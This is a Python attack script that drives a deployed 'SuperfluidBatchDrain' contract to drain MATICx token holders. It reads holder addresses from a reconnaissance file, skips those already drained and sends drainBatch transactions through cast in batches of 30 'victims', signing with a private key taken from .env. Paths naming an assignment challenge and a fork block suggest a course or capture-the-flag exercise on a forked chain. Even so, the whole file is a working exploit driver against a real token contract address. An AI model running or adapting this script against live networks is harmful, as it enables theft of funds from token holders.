#!/usr/bin/env python3
"""Batch drain MATICx holders using the deployed SuperfluidBatchDrain contract."""
import json
import os
import subprocess
import sys
import time

RPC = "https://REDACTED.example.invalid/9211c782-ae68-44dd-96a4-6a307c4e3091/rpc/4gi_akali:575d580ce56856c4751f2afb8daf13cc21c4eefd48958f1734e36a44d5f23734"
DRAINER = "0x135bA7F14dB39f76e53F463F753472F4a029a6E7"
MATICX = "0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3"
RECON_FILE = "/Users/dldustn/Desktop/upside_assignment/AssignmentC/challenges/ch4_superfluid/recon/tmp_scan/maticx_fork24684669_positive_full.tsv"
BATCH_SIZE = 30  # victims per transaction
# Already drained in initial script:
ALREADY_DRAINED = {
    "0xb47a9b6f062c33ed78630478dff9056687f840f2",
    "0x9c6b5fdc145912dfe6ee13a667af3c5eb07cbb89",
    "0xed50f0534894676ca5aa259622dfbce1d6461d3c",
    "0x8ef0d78023394f15732e9db2614bd2e9a1ee04a2",
    "0x1fe6a806e0a9858359e16c58e4f84c790171596b",
}


def get_private_key():
    """Read PRIVATE_KEY from .env"""
    env_path = "/Users/dldustn/Desktop/upside_assignment/AssignmentC/.env"
    with open(env_path) as f:
        for line in f:
            if line.startswith("PRIVATE_KEY="):
                return line.strip().split("=", 1)[1]
    raise RuntimeError("PRIVATE_KEY not found")


def check_remaining():
    """Check MATICx.balance"""
    result = subprocess.run(
        ["cast", "balance", MATICX, "--rpc-url", RPC],
        capture_output=True, text=True, timeout=30
    )
    if result.returncode != 0:
        return -1
    return int(result.stdout.strip())


def send_batch(pk, addrs):
    """Send drainBatch transaction"""
    # Format: drainBatch(address[])
    addr_list = "[" + ",".join(addrs) + "]"
    sig = "drainBatch(address[])"

    result = subprocess.run(
        ["cast", "send", DRAINER, sig, addr_list,
         "--rpc-url", RPC, "--private-key", pk,
         "--gas-limit", "29000000"],
        capture_output=True, text=True, timeout=300
    )
    return result.returncode == 0, result.stderr


def main():
    pk = get_private_key()

    # Load all addresses
    addrs = []
    with open(RECON_FILE) as f:
        for line in f:
            parts = line.strip().split('\t')
            if len(parts) >= 2:
                addr = parts[0].lower()
                if addr not in ALREADY_DRAINED:
                    addrs.append(addr)

    print(f"Total addresses to drain: {len(addrs)}")

    remaining = check_remaining()
    print(f"MATICx backing: {remaining / 1e18:.2f} MATIC")

    total_batches = (len(addrs) + BATCH_SIZE - 1) // BATCH_SIZE
    success_count = 0
    fail_count = 0

    for i in range(0, len(addrs), BATCH_SIZE):
        if remaining <= 0:
            print("MATICx fully drained!")
            break

        batch = addrs[i:i + BATCH_SIZE]
        batch_num = i // BATCH_SIZE + 1

        ok, err = send_batch(pk, batch)
        if ok:
            success_count += 1
        else:
            fail_count += 1
            if "node not ready" in err or "timed out" in err:
                print(f"RPC issue, waiting 30s...")
                time.sleep(30)
                ok, err = send_batch(pk, batch)
                if ok:
                    success_count += 1
                    fail_count -= 1

        if batch_num % 10 == 0:
            remaining = check_remaining()
            print(f"Batch {batch_num}/{total_batches}: remaining={remaining / 1e18:.2f} MATIC, ok={success_count}, fail={fail_count}")

    remaining = check_remaining()
    print(f"\nFinal MATICx backing: {remaining / 1e18:.2f} MATIC")
    print(f"Success: {success_count}, Failed: {fail_count}")


if __name__ == '__main__':
    main()
